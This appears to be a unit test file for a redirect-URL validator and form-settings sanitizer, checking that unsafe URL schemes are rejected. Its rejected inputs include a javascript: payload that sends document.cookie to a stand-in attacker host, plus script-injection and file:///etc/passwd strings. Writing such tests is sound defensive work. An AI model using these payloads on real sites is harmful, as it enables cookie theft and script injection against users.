import {
  isSafeRedirectUrl,
  sanitizeFormSettings,
} from './form-settings-sanitizer.util';

describe('isSafeRedirectUrl', () => {
  it.each([
    'https://example.com',
    'https://example.com/thanks?ref=1',
    // Plain http is allowed on purpose: on-prem deployments redirect to
    // intranet hosts that have no TLS.
    'http://intranet.corp/done',
  ])('accepts %s', (url) => {
    expect(isSafeRedirectUrl(url)).toBe(true);
  });

  it.each([
    // The actual exploit: assigning this to window.location.href executes.
    "javascript:fetch('https://evil.tld/?c='+document.cookie)",
    'JaVaScRiPt:alert(1)',
    '  javascript:alert(1)  ',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    // Relative targets are ambiguous without a base and no caller wants one.
    '/thanks',
    'thanks',
    '',
    '   ',
  ])('rejects %s', (url) => {
    expect(isSafeRedirectUrl(url)).toBe(false);
  });

  it.each([null, undefined, 42, {}, []])('rejects non-string %s', (value) => {
    expect(isSafeRedirectUrl(value)).toBe(false);
  });
});

describe('sanitizeFormSettings', () => {
  it('drops an unsafe redirect_url and keeps every other key', () => {
    const result = sanitizeFormSettings({
      redirect_url: 'javascript:alert(1)',
      success_message: 'Thanks!',
      task_integration: { enabled: true, target_space_id: 'abc' },
    });

    expect(result).not.toHaveProperty('redirect_url');
    expect(result).toEqual({
      success_message: 'Thanks!',
      task_integration: { enabled: true, target_space_id: 'abc' },
    });
  });

  it('preserves a safe redirect_url', () => {
    const settings = { redirect_url: 'https://example.com/thanks' };

    expect(sanitizeFormSettings(settings)).toEqual(settings);
  });

  it('preserves an explicitly cleared redirect (means "show success message")', () => {
    expect(sanitizeFormSettings({ redirect_url: '' })).toEqual({
      redirect_url: '',
    });
    expect(sanitizeFormSettings({ redirect_url: null })).toEqual({
      redirect_url: null,
    });
  });

  it('passes through settings with no redirect_url untouched', () => {
    const settings = { styles: { page_color: '#fff' }, max_responses: 10 };

    expect(sanitizeFormSettings(settings)).toBe(settings);
  });

  it('does not mutate the caller-supplied object', () => {
    const settings = { redirect_url: 'javascript:alert(1)', keep: true };

    sanitizeFormSettings(settings);

    expect(settings.redirect_url).toBe('javascript:alert(1)');
  });

  it('is a no-op for non-object input', () => {
    expect(sanitizeFormSettings(null)).toBeNull();
    expect(sanitizeFormSettings(undefined)).toBeUndefined();
  });

  // settings is an open blob (task_integration, styles, approval, ...). A
  // whitelist here would silently drop new features as they ship.
  it('does not whitelist — unknown keys survive', () => {
    const settings = { some_future_feature: { nested: [1, 2, 3] } };

    expect(sanitizeFormSettings(settings)).toEqual(settings);
  });
});
